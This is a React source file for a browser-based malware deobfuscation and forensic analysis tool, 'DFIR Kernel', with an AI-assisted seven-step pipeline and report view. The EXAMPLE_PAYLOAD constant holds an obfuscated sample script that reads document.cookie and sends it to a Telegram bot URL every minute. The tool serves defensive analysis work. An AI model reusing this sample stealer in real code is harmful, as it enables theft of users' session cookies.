
import React, { useState, useRef } from 'react';
import { DeobfuscationStep, TransformationResult, AnalysisSummary } from './types';
import { aiFactory } from './services/aiFactory';
import { stabilizeCode, decodeHexEscapes, resolveArrayRotations, staticIocScan } from './utils/deobfuscationLogic';
import { CodeEditor } from './components/CodeEditor';
import { 
  ShieldAlert, 
  Workflow, 
  Play, 
  CheckCircle2, 
  History, 
  FileSearch, 
  Code2, 
  RefreshCw, 
  LayoutGrid, 
  Sparkles, 
  Download, 
  Trash2, 
  ShieldCheck, 
  SearchCode, 
  Printer, 
  Bug, 
  FlaskConical, 
  Copy, 
  Check,
  ChevronDown,
  Cpu,
  Zap,
  Brain,
  FileText,
  Upload,
  BookOpen,
  X,
  Info,
  ExternalLink,
  Target
} from 'lucide-react';

const EXAMPLE_PAYLOAD = `(function(_0x1b2c, _0x3d4e) {
    const _0x5f6a = function(_0x2a3b) {
        while (--_0x2a3b) {
            _0x1b2c['push'](_0x1b2c['shift']());
        }
    };
    _0x5f6a(++_0x3d4e);
}(['\x63\x6f\x6f\x6b\x69\x65', '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\x6f\x72\x67\x2f\x62\x6f\x74', '\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65', '\x54\x4f\x4b\x45\x4e\x5f\x31\x32\x33', '\x67\x65\x74'], 0x1));

const _0x4a2b = function(_0x5c3d, _0x1e2f) {
    _0x5c3d = _0x5c3d - 0x0;
    const _0x3b4a = ['cookie', 'https://api.telegram.org/bot', 'sendMessage', 'TOKEN_123', 'get'];
    return _0x3b4a[_0x5c3d];
};

async function exfiltrate() {
    const _0x1122 = _0x4a2b('0x1') + _0x4a2b('0x3') + '/' + _0x4a2b('0x2');
    const _0x3344 = document[_0x4a2b('0x0')];
    
    try {
        await fetch(_0x1122 + '?chat_id=987654&text=' + btoa(_0x3344));
    } catch (_0x5566) {
        console.error('Network Error');
    }
}

setInterval(exfiltrate, 1000 * 60);`;

const App: React.FC = () => {
  const [inputCode, setInputCode] = useState<string>('');
  const [history, setHistory] = useState<TransformationResult[]>([]);
  const [isProcessing, setIsProcessing] = useState(false);
  const [activeStepIndex, setActiveStepIndex] = useState(-1);
  const [analysis, setAnalysis] = useState<AnalysisSummary | null>(null);
  const [viewMode, setViewMode] = useState<'editor' | 'report'>('editor');
  const [copied, setCopied] = useState(false);
  const [selectedAI, setSelectedAI] = useState(aiFactory.getActiveId());
  const [showAISelector, setShowAISelector] = useState(false);
  const [showManual, setShowManual] = useState(false);
  
  const fileInputRef = useRef<HTMLInputElement>(null);

  const steps = [
    { type: DeobfuscationStep.STABILIZE, label: '01 | Structural Stabilization' },
    { type: DeobfuscationStep.LITERAL_DECODE, label: '02 | Literal Expansion' },
    { type: DeobfuscationStep.DECOMPILE, label: '03 | VM Opcode Recovery' },
    { type: DeobfuscationStep.REFERENCE_RESOLVE, label: '04 | Deterministic Inlining' },
    { type: DeobfuscationStep.SEMANTIC_CLEANUP, label: '05 | Evidence Reconstruction' },
    { type: DeobfuscationStep.REFINE, label: '06 | Forensic Annotation' },
    { type: DeobfuscationStep.ANALYZE, label: '07 | Intelligence Dissection' }
  ];

  const handleAISelect = (id: string) => {
    aiFactory.setActiveService(id);
    setSelectedAI(id);
    setShowAISelector(false);
  };

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = (event) => {
        const content = event.target?.result as string;
        setInputCode(content);
        setHistory([]);
        setAnalysis(null);
      };
      reader.readAsText(file);
    }
  };

  const getAIIcon = (id: string) => {
    switch (id) {
      case 'gemini-pro': return <Cpu className="w-3.5 h-3.5" />;
      case 'gemini-flash': return <Zap className="w-3.5 h-3.5" />;
      case 'gpt-4o': return <Brain className="w-3.5 h-3.5" />;
      default: return <Sparkles className="w-3.5 h-3.5" />;
    }
  };

  const getCurrentCode = () => {
    if (history.length === 0) return '';
    const codeSteps = history.filter(h => h.step !== DeobfuscationStep.ANALYZE);
    return codeSteps.length > 0 ? codeSteps[codeSteps.length - 1].content : '';
  };

  const loadExample = () => {
    setInputCode(EXAMPLE_PAYLOAD);
    setHistory([]);
    setAnalysis(null);
    setViewMode('editor');
  };

  const runPipeline = async () => {
    if (!inputCode) return;
    setIsProcessing(true);
    setHistory([]);
    setAnalysis(null);
    setViewMode('editor');
    
    let workingCode = inputCode;
    const currentService = aiFactory.getActiveService();

    for (let i = 0; i < steps.length; i++) {
      const step = steps[i];
      setActiveStepIndex(i);
      
      try {
        let result: string = '';
        let description = '';

        if (step.type === DeobfuscationStep.STABILIZE) {
          result = stabilizeCode(workingCode);
          description = 'Normalizing structure... OK.';
        } else if (step.type === DeobfuscationStep.LITERAL_DECODE) {
          let decoded = decodeHexEscapes(workingCode);
          result = resolveArrayRotations(decoded);
          description = 'Static pool expansion... OK.';
        } else {
          result = await currentService.processStep(step.type, workingCode);
          description = `[DET-KRNL] Phase ${i + 1} finalized.`;
        }

        if (step.type === DeobfuscationStep.ANALYZE) {
          try {
            const summary: AnalysisSummary = JSON.parse(result);
            const staticIocs = staticIocScan(workingCode);
            const mergedIocs = [...summary.ioCs];
            staticIocs.forEach(sIoc => {
              const alreadyExists = mergedIocs.some(existing => existing.value.toLowerCase() === sIoc.value.toLowerCase());
              if (!alreadyExists) mergedIocs.push(sIoc);
            });
            setAnalysis({ ...summary, ioCs: mergedIocs });
            setViewMode('report');
          } catch (e) {
            console.error("Analysis parsing failed", result);
          }
        } else {
          workingCode = result || workingCode;
          setHistory(prev => [...prev, {
            step: step.type,
            content: workingCode,
            description,
            status: 'success',
            timestamp: Date.now()
          }]);
        }
      } catch (error) {
        setHistory(prev => [...prev, {
          step: step.type,
          content: workingCode,
          description: `TERMINATED: ${(error as Error).message}`,
          status: 'error',
          timestamp: Date.now()
        }]);
        break;
      }
    }
    setIsProcessing(false);
    setActiveStepIndex(-1);
  };

  const downloadResult = () => {
    const code = getCurrentCode();
    if (!code) return;
    const blob = new Blob([code], { type: 'text/javascript' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `recovered_artifact_${Date.now()}.js`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const copyCode = () => {
    const code = getCurrentCode();
    if (!code) return;
    navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handlePrint = () => {
    window.print();
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#0a0a0c] text-slate-300 select-none print:bg-white print:text-black">
      {/* Universal Header */}
      <nav className="h-14 border-b border-white/5 bg-[#0d0d0f] flex items-center px-6 justify-between sticky top-0 z-50 print:hidden shrink-0">
        <div className="flex items-center gap-3">
          <div className="w-8 h-8 bg-blue-600 rounded flex items-center justify-center shadow-[0_0_20px_rgba(37,99,235,0.4)] transition-transform hover:scale-105">
            <Target className="w-5 h-5 text-white" />
          </div>
          <div className="flex flex-col">
            <span className="font-bold tracking-tighter text-white text-lg leading-none italic uppercase">DFIR <span className="text-blue-500 font-black">Kernel</span></span>
            <span className="text-[9px] font-mono text-slate-500 uppercase tracking-widest mt-1">Professional Forensic Tooling</span>
          </div>
        </div>

        <div className="flex items-center gap-4">
          <button 
            onClick={() => setShowManual(true)}
            className="flex items-center gap-2 px-3 py-1.5 text-slate-400 hover:text-white transition-colors text-xs font-bold uppercase tracking-widest"
          >
            <BookOpen className="w-4 h-4 text-blue-500" /> Manual / SOP
          </button>

          <div className="h-6 w-px bg-white/10"></div>

          <div className="relative">
            <button 
              onClick={() => setShowAISelector(!showAISelector)}
              className="flex items-center gap-2 px-3 py-1.5 bg-white/5 border border-white/10 rounded-lg text-xs hover:bg-white/10 transition-all min-w-[140px]"
            >
              <span className="text-blue-500">{getAIIcon(selectedAI)}</span>
              <span className="flex-1 text-left font-medium">{aiFactory.getAvailableServices().find(s => s.id === selectedAI)?.name}</span>
              <ChevronDown className={`w-3 h-3 text-slate-500 transition-transform ${showAISelector ? 'rotate-180' : ''}`} />
            </button>
            
            {showAISelector && (
              <div className="absolute top-full right-0 mt-2 w-48 bg-[#121215] border border-white/10 rounded-xl shadow-2xl overflow-hidden z-[100]">
                {aiFactory.getAvailableServices().map((service) => (
                  <button
                    key={service.id}
                    onClick={() => handleAISelect(service.id)}
                    className={`w-full flex items-center gap-3 px-4 py-3 text-xs text-left hover:bg-white/5 transition-colors border-b border-white/5 last:border-0 ${selectedAI === service.id ? 'bg-blue-600/10 text-blue-400' : 'text-slate-400'}`}
                  >
                    {getAIIcon(service.id)}
                    <div className="flex flex-col">
                      <span className="font-bold">{service.name}</span>
                      <span className="text-[9px] text-slate-600 uppercase tracking-tighter">
                        {service.id === 'gpt-4o' ? 'OpenAI' : 'Google Gemini'}
                      </span>
                    </div>
                  </button>
                ))}
              </div>
            )}
          </div>

          <div className="h-6 w-px bg-white/10"></div>

          <div className="flex bg-white/5 p-1 rounded border border-white/10">
            <button 
              onClick={() => setViewMode('editor')}
              className={`px-3 py-1 text-xs rounded transition-all flex items-center gap-2 ${viewMode === 'editor' ? 'bg-blue-600 text-white shadow-md' : 'text-slate-400 hover:text-white'}`}
            >
              <Code2 className="w-3.5 h-3.5" /> Workspace
            </button>
            <button 
              disabled={!analysis}
              onClick={() => setViewMode('report')}
              className={`px-3 py-1 text-xs rounded transition-all flex items-center gap-2 ${!analysis ? 'opacity-20 cursor-not-allowed' : viewMode === 'report' ? 'bg-blue-600 text-white shadow-md' : 'text-slate-400 hover:text-white'}`}
            >
              <FileText className="w-3.5 h-3.5" /> Intel Report
            </button>
          </div>
          
          <button
            onClick={runPipeline}
            disabled={isProcessing || !inputCode}
            className={`px-4 py-1.5 rounded text-xs font-bold transition-all flex items-center gap-2 border tracking-wider ${
              isProcessing ? 'bg-slate-800 border-slate-700 text-slate-500' : 'bg-blue-600 border-blue-400/50 text-white hover:bg-blue-500 shadow-lg'
            }`}
          >
            {isProcessing ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Play className="w-3.5 h-3.5 fill-current" />}
            {isProcessing ? 'PROCESSING...' : 'EXECUTE PIPELINE'}
          </button>
        </div>
      </nav>

      {/* Main Workspace */}
      <div className="flex-1 flex overflow-hidden">
        {/* Progress Sidebar */}
        <aside className="w-72 border-r border-white/5 bg-[#0d0d0f] flex flex-col shrink-0 print:hidden overflow-hidden">
          <div className="p-4 border-b border-white/5 flex items-center justify-between shrink-0">
            <h2 className="text-[10px] font-black uppercase tracking-[0.2em] text-slate-500 flex items-center gap-2">
              <Workflow className="w-3.5 h-3.5 text-blue-500" /> Det. Pipeline
            </h2>
            <button 
              onClick={() => { setHistory([]); setInputCode(''); setAnalysis(null); setViewMode('editor'); }} 
              className="p-1 hover:text-red-400 transition-colors"
              title="Reset System"
            >
              <Trash2 className="w-3.5 h-3.5" />
            </button>
          </div>
          
          <div className="flex-1 overflow-y-auto p-4 space-y-4 scrollbar-thin scrollbar-thumb-slate-800">
            {steps.map((step, idx) => {
              const res = history.find(h => h.step === step.type);
              const isAnalyzed = step.type === DeobfuscationStep.ANALYZE && analysis;
              const isActive = activeStepIndex === idx;
              
              const isCompleted = res || isAnalyzed;

              return (
                <div key={idx} className={`relative pl-7 pb-4 border-l transition-all ${
                  isCompleted ? 'border-blue-500/50' : isActive ? 'border-blue-500' : 'border-white/5'
                }`}>
                  <div className={`absolute -left-[9px] top-0 w-4 h-4 rounded flex items-center justify-center border transition-all ${
                    isCompleted ? 'bg-blue-600 border-blue-500 text-white shadow-lg' : isActive ? 'bg-blue-500 border-blue-400 animate-pulse scale-110' : 'bg-[#0a0a0c] border-white/10 text-slate-700'
                  }`}>
                    {isCompleted ? <CheckCircle2 className="w-2.5 h-2.5" /> : <span className="text-[9px] font-bold">{idx + 1}</span>}
                  </div>
                  <h3 className={`text-[11px] font-bold uppercase tracking-wide ${isActive ? 'text-blue-400' : isCompleted ? 'text-slate-200' : 'text-slate-600'}`}>
                    {step.label.split('|')[1].trim()}
                  </h3>
                  <p className="text-[9px] text-slate-500 mt-1 leading-tight">
                    {isActive ? 'Processing deterministic segments...' : isCompleted ? 'Verification OK' : 'Awaiting phase ingestion'}
                  </p>
                </div>
              );
            })}
          </div>

          <div className="p-4 border-t border-white/5 space-y-2 bg-white/[0.01] shrink-0">
            <input 
              type="file" 
              ref={fileInputRef} 
              className="hidden" 
              onChange={handleFileUpload}
              accept=".js,.txt,.json,.html"
            />
            
            <div className="grid grid-cols-2 gap-2">
              <button 
                onClick={() => fileInputRef.current?.click()}
                className="py-2 bg-white/5 border border-white/10 rounded text-[10px] font-bold text-slate-400 hover:bg-white/10 transition-all flex items-center justify-center gap-2"
              >
                <Upload className="w-3 h-3 text-blue-400" /> Artifact
              </button>
              <button 
                onClick={loadExample}
                className="py-2 bg-white/5 border border-white/10 rounded text-[10px] font-bold text-slate-400 hover:bg-white/10 transition-all flex items-center justify-center gap-2"
              >
                <FlaskConical className="w-3 h-3 text-orange-400" /> Sample
              </button>
            </div>
            
            {getCurrentCode() && (
              <>
                <button 
                  onClick={copyCode}
                  className="w-full py-2 bg-purple-600/20 border border-purple-500/30 rounded text-[10px] font-bold text-purple-400 hover:bg-purple-600/30 transition-all flex items-center justify-center gap-2"
                >
                  <Sparkles className="w-3 h-3" /> Re-Iterate
                </button>
                <button 
                  onClick={downloadResult}
                  className="w-full py-2 bg-blue-600/20 border border-blue-500/30 rounded text-[10px] font-bold text-blue-400 hover:bg-blue-600/30 transition-all flex items-center justify-center gap-2"
                >
                  <Download className="w-3 h-3" /> Export Code
                </button>
              </>
            )}
          </div>
        </aside>

        {/* Dynamic Display */}
        <main className="flex-1 bg-[#050507] relative overflow-hidden print:bg-white print:overflow-visible print:static">
          {viewMode === 'editor' ? (
            <div className="h-full grid grid-cols-1 lg:grid-cols-2 gap-px bg-white/5 print:hidden">
              <CodeEditor label="Source Ingestion" value={inputCode} onChange={setInputCode} />
              <CodeEditor 
                label="Forensic Artifact" 
                value={getCurrentCode()} 
                readOnly 
                actions={getCurrentCode() ? (
                  <div className="flex gap-2">
                    <button onClick={copyCode} className="p-1.5 hover:bg-white/5 rounded text-slate-500 hover:text-white transition-colors">
                      {copied ? <Check className="w-3.5 h-3.5 text-green-500" /> : <Copy className="w-3.5 h-3.5" />}
                    </button>
                    <button onClick={downloadResult} className="p-1.5 hover:bg-white/5 rounded text-slate-500 hover:text-white transition-colors">
                      <Download className="w-3.5 h-3.5 text-blue-500" />
                    </button>
                  </div>
                ) : null}
              />
            </div>
          ) : analysis ? (
            <div className="h-full overflow-y-auto p-12 lg:p-16 scrollbar-thin scrollbar-thumb-slate-800 print:p-0 print:overflow-visible print:block print:h-auto">
              <div className="max-w-4xl mx-auto space-y-12 pb-20 print:space-y-10 print:pb-0">
                <header className="flex justify-between items-end border-b border-white/10 pb-8 print:border-black print:pb-6">
                  <div className="space-y-2">
                    <div className="flex items-center gap-2 text-blue-500 text-xs font-bold uppercase tracking-[0.3em] print:text-blue-800">
                      <ShieldCheck className="w-4 h-4" /> Cyber Intelligence Phase
                    </div>
                    <h1 className="text-4xl font-black text-white tracking-tight uppercase print:text-black leading-none">Investigatory Summary</h1>
                    <p className="text-[10px] font-mono text-slate-500 uppercase print:text-slate-600">Engine: {aiFactory.getActiveService().name} [T:0]</p>
                  </div>
                  <div className="flex flex-col items-end gap-3 print:hidden">
                    <div className={`px-5 py-1.5 rounded-full border font-black text-[10px] uppercase tracking-[0.2em] shadow-2xl ${
                      analysis.threatLevel === 'critical' ? 'bg-red-500/10 border-red-500 text-red-500 animate-pulse' : 
                      analysis.threatLevel === 'high' ? 'bg-orange-500/10 border-orange-500 text-orange-500' : 'bg-blue-500/10 border-blue-500 text-blue-500'
                    }`}>
                      {analysis.threatLevel} Severity
                    </div>
                    <div className="flex gap-2">
                      <button onClick={downloadResult} className="flex items-center gap-2 text-[10px] font-bold text-slate-400 hover:text-white bg-blue-600/10 px-3 py-1.5 rounded border border-blue-500/20 active:scale-95">
                        <Download className="w-3 h-3 text-blue-500" /> Source
                      </button>
                      <button onClick={handlePrint} className="flex items-center gap-2 text-[10px] font-bold text-slate-400 hover:text-white bg-white/5 px-3 py-1.5 rounded border border-white/10 active:scale-95">
                        <Printer className="w-3 h-3" /> Print
                      </button>
                    </div>
                  </div>
                </header>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-10 print:grid-cols-1 print:gap-8">
                  <section className="space-y-4 print:break-inside-avoid">
                    <h2 className="text-[10px] font-black text-slate-500 uppercase tracking-widest flex items-center gap-2 print:text-black print:border-b print:pb-1">
                      <LayoutGrid className="w-3.5 h-3.5 text-blue-500" /> Behavioral Assessment
                    </h2>
                    <p className="text-slate-300 text-sm leading-relaxed bg-white/[0.02] p-6 rounded-xl border border-white/5 print:bg-slate-50 print:text-black print:border-slate-200 print:p-4">
                      {analysis.attackVector}
                    </p>
                  </section>
                  <section className="space-y-4 print:break-inside-avoid">
                    <h2 className="text-[10px] font-black text-slate-500 uppercase tracking-widest flex items-center gap-2 print:text-black print:border-b print:pb-1">
                      <ShieldAlert className="w-3.5 h-3.5 text-red-500" /> Observed Impacts
                    </h2>
                    <div className="grid grid-cols-1 gap-2">
                      {analysis.impacts.map((impact, i) => (
                        <div key={i} className="p-3 bg-red-500/5 rounded-lg border border-red-500/10 text-xs text-slate-400 flex items-center gap-3 print:bg-white print:border-slate-200 print:text-black">
                          <div className="w-1.5 h-1.5 bg-red-500 rounded-full shrink-0" />
                          {impact}
                        </div>
                      ))}
                    </div>
                  </section>
                </div>

                <section className="space-y-4 print:break-inside-avoid">
                  <h2 className="text-[10px] font-black text-slate-500 uppercase tracking-widest flex items-center gap-2 print:text-black print:border-b print:pb-1">
                    <History className="w-3.5 h-3.5 text-purple-500" /> Kill Chain Analysis
                  </h2>
                  <div className="space-y-3 relative before:absolute before:left-[19px] before:top-2 before:bottom-2 before:w-px before:bg-white/5 print:before:bg-slate-200">
                    {analysis.flowDescription.map((step, i) => (
                      <div key={i} className="flex gap-4 items-start relative group">
                        <div className="w-10 h-10 rounded-lg bg-[#0d0d0f] border border-white/5 flex items-center justify-center text-[10px] font-mono text-slate-500 font-bold shrink-0 z-10 print:bg-slate-100 print:border-slate-300 print:text-black">
                          {i + 1}
                        </div>
                        <div className="flex-1 pt-2 text-sm text-slate-400 leading-relaxed print:text-black">
                          {step}
                        </div>
                      </div>
                    ))}
                  </div>
                </section>

                <section className="space-y-4 print:break-inside-avoid">
                  <h2 className="text-[10px] font-black text-slate-500 uppercase tracking-widest flex items-center gap-2 print:text-black print:border-b print:pb-1">
                    <SearchCode className="w-3.5 h-3.5 text-green-500" /> Indicator Repository
                  </h2>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 print:grid-cols-1">
                    {analysis.ioCs.map((ioc, i) => (
                      <div key={i} className="p-4 bg-white/5 rounded-xl border border-white/10 flex flex-col gap-1.5 print:bg-white print:border-slate-300">
                        <div className="flex justify-between items-center">
                          <span className="text-[8px] font-black text-green-500/70 uppercase tracking-widest">{ioc.type}</span>
                          {ioc.context && <span className="text-[8px] text-slate-600 uppercase font-mono print:text-slate-400">{ioc.context}</span>}
                        </div>
                        <code className="text-xs text-blue-400 truncate font-mono print:text-blue-800">{ioc.value}</code>
                      </div>
                    ))}
                  </div>
                </section>

                <section className="space-y-4 print:break-inside-avoid">
                  <h2 className="text-[10px] font-black text-slate-500 uppercase tracking-widest flex items-center gap-2 print:text-black print:border-b print:pb-1">
                    <Bug className="w-3.5 h-3.5 text-orange-500" /> Detection Signatures
                  </h2>
                  <div className="space-y-6">
                    {analysis.detectionRules.map((rule, i) => (
                      <div key={i} className="bg-[#08080a] rounded-2xl border border-white/5 overflow-hidden print:border-slate-300">
                        <div className="px-4 py-2 border-b border-white/5 bg-white/[0.02] flex justify-between items-center print:bg-slate-50">
                          <span className="text-[9px] font-black text-orange-500 tracking-[0.2em]">{rule.type} BLOCK</span>
                        </div>
                        <div className="p-6 print:p-4">
                           <p className="text-[10px] text-slate-500 mb-4 italic leading-relaxed print:text-slate-700">"{rule.description}"</p>
                           <pre className="text-xs text-slate-400 font-mono leading-relaxed overflow-x-auto p-4 bg-black/40 rounded-lg whitespace-pre-wrap select-all border border-white/5 print:bg-slate-100 print:text-black print:border-slate-300">
                            {rule.content}
                           </pre>
                        </div>
                      </div>
                    ))}
                  </div>
                </section>
                
                <footer className="pt-10 border-t border-white/5 text-center hidden print:block">
                  <p className="text-[8px] text-slate-400 uppercase tracking-[0.4em]">Confidential Forensic Intelligence // Generated via DFIR Kernel</p>
                </footer>
              </div>
            </div>
          ) : (
            <div className="h-full flex flex-col items-center justify-center text-slate-800 gap-6 opacity-30 print:hidden">
               <div className="relative">
                  <div className="absolute inset-0 bg-blue-500/20 blur-3xl animate-pulse rounded-full" />
                  <Target className="w-20 h-20 relative animate-pulse text-slate-600" />
               </div>
               <div className="text-center">
                 <p className="text-[10px] font-bold uppercase tracking-[0.6em] text-slate-400">Lab Idle</p>
                 <p className="text-xs mt-2 font-medium">Ingest payload to initiate forensic logic reconstruction</p>
               </div>
            </div>
          )}
        </main>
      </div>

      {/* Manual SOP Modal */}
      {showManual && (
        <div className="fixed inset-0 z-[200] flex items-center justify-center p-6 sm:p-12">
          <div className="absolute inset-0 bg-black/80 backdrop-blur-sm" onClick={() => setShowManual(false)} />
          <div className="relative w-full max-w-4xl max-h-full bg-[#0d0d0f] border border-white/10 rounded-2xl shadow-2xl flex flex-col overflow-hidden animate-in fade-in zoom-in duration-300">
            <header className="px-6 h-14 border-b border-white/5 flex items-center justify-between bg-white/[0.02]">
              <div className="flex items-center gap-3">
                <BookOpen className="w-5 h-5 text-blue-500" />
                <h2 className="text-sm font-black uppercase tracking-widest text-white">Laboratory Standard Operating Procedure</h2>
              </div>
              <button onClick={() => setShowManual(false)} className="p-2 hover:bg-white/5 rounded-lg text-slate-400 hover:text-white transition-colors">
                <X className="w-5 h-5" />
              </button>
            </header>
            <div className="flex-1 overflow-y-auto p-8 space-y-10 scrollbar-thin scrollbar-thumb-slate-800 text-sm leading-relaxed text-slate-400">
              <section className="space-y-4">
                <div className="flex items-center gap-2 text-white font-bold uppercase text-[11px] tracking-widest">
                  <Info className="w-4 h-4 text-blue-500" /> Functional Overview
                </div>
                <p>
                  DFIR Kernel is a specialized environment for high-determinism deobfuscation. Unlike general-purpose AI chat interfaces, this kernel uses a structured 7-phase pipeline designed to extract provable logic from polymorphic and VM-obfuscated scripts.
                </p>
              </section>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                <section className="space-y-4">
                  <div className="flex items-center gap-2 text-white font-bold uppercase text-[11px] tracking-widest">
                    <Workflow className="w-4 h-4 text-purple-500" /> Operational Protocol
                  </div>
                  <ul className="space-y-3">
                    <li className="flex gap-3">
                      <span className="font-mono text-blue-500">01</span>
                      <span>**Stabilization**: Resets whitespace/bracing for AST parity.</span>
                    </li>
                    <li className="flex gap-3">
                      <span className="font-mono text-blue-500">02</span>
                      <span>**Expansion**: Resolves string pool rotations statically.</span>
                    </li>
                    <li className="flex gap-3">
                      <span className="font-mono text-blue-500">03</span>
                      <span>**Recovery**: Maps Opcodes back to linear logic handlers.</span>
                    </li>
                    <li className="flex gap-3">
                      <span className="font-mono text-blue-500">04</span>
                      <span>**Inlining**: Replaces proxy functions with actual calls.</span>
                    </li>
                    <li className="flex gap-3">
                      <span className="font-mono text-blue-500">05</span>
                      <span>**Reconstruction**: Renames based on observed API patterns.</span>
                    </li>
                  </ul>
                </section>

                <section className="space-y-4">
                  <div className="flex items-center gap-2 text-white font-bold uppercase text-[11px] tracking-widest">
                    <Zap className="w-4 h-4 text-orange-500" /> Engine Selection [T:0]
                  </div>
                  <div className="p-4 rounded-xl bg-white/[0.03] border border-white/5 space-y-4">
                    <div>
                      <div className="flex items-center gap-2 text-slate-200 font-bold text-xs mb-1">
                        <Cpu className="w-3.5 h-3.5" /> Gemini 3 Pro
                      </div>
                      <p className="text-xs">Highest precision for VM-based logic. Best for multi-layered obfuscation.</p>
                    </div>
                    <div>
                      <div className="flex items-center gap-2 text-slate-200 font-bold text-xs mb-1">
                        <Zap className="w-3.5 h-3.5 text-yellow-500" /> Gemini 3 Flash
                      </div>
                      <p className="text-xs">Optimized for throughput. Use for generic string-pool based payloads.</p>
                    </div>
                  </div>
                </section>
              </div>

              <section className="space-y-4">
                <div className="flex items-center gap-2 text-white font-bold uppercase text-[11px] tracking-widest">
                  <ShieldCheck className="w-4 h-4 text-green-500" /> Forensic Integrity
                </div>
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                  <div className="p-4 bg-white/5 rounded-xl border border-white/5">
                    <div className="text-xs font-bold text-slate-200 mb-2 uppercase tracking-tighter">Deterministic</div>
                    <p className="text-[11px]">Temperature is set to 0.0 to ensure repeatable and consistent output.</p>
                  </div>
                  <div className="p-4 bg-white/5 rounded-xl border border-white/5">
                    <div className="text-xs font-bold text-slate-200 mb-2 uppercase tracking-tighter">Evidence-Based</div>
                    <p className="text-[11px]">Identifier renaming is strictly mapped to observed API behavior.</p>
                  </div>
                  <div className="p-4 bg-white/5 rounded-xl border border-white/5">
                    <div className="text-xs font-bold text-slate-200 mb-2 uppercase tracking-tighter">Structured Intel</div>
                    <p className="text-[11px]">IoC extraction is cross-referenced between AI and regex scanners.</p>
                  </div>
                </div>
              </section>

              <footer className="pt-6 border-t border-white/5 flex justify-between items-center text-[10px] uppercase tracking-widest">
                <span className="text-slate-600">Lab Kernel Version: 4.2.1-DET</span>
                <div className="flex items-center gap-4">
                  <span className="text-blue-500/50">Forensic Pipeline OK</span>
                </div>
              </footer>
            </div>
          </div>
        </div>
      )}

      <footer className="h-10 border-t border-white/5 bg-[#0d0d0f] px-6 flex items-center justify-between text-[10px] font-mono text-slate-600 tracking-tighter print:hidden shrink-0">
        <div className="flex gap-10">
          <div className="flex items-center gap-2">
            <div className="w-1.5 h-1.5 rounded-full bg-blue-500 shadow-[0_0_8px_rgba(59,130,246,0.5)]" />
            ENGINE_KRNL_V4.2_ONLINE
          </div>
          <div className="flex items-center gap-2 uppercase">
            ACTIVE_INTEL: {aiFactory.getActiveService().id.toUpperCase()} [T:0.0]
          </div>
        </div>
        <div className="hidden sm:flex gap-6 uppercase">
          <span>PIPELINE: DETERMINISTIC</span>
          <span>© 2024 DFIR LABS KERNEL</span>
        </div>
      </footer>

      <style>{`
        @media print {
          @page { margin: 1.5cm; }
          body { background: white !important; }
          .print-hidden { display: none !important; }
          * { -webkit-print-color-adjust: exact !important; color-adjust: exact !important; }
          pre { white-space: pre-wrap !important; word-break: break-all !important; }
          .rounded-xl, .rounded-2xl { border-radius: 4px !important; border: 1px solid #ddd !important; }
          section { page-break-inside: avoid; margin-bottom: 2rem; }
        }
      `}</style>
    </div>
  );
};

export default App;
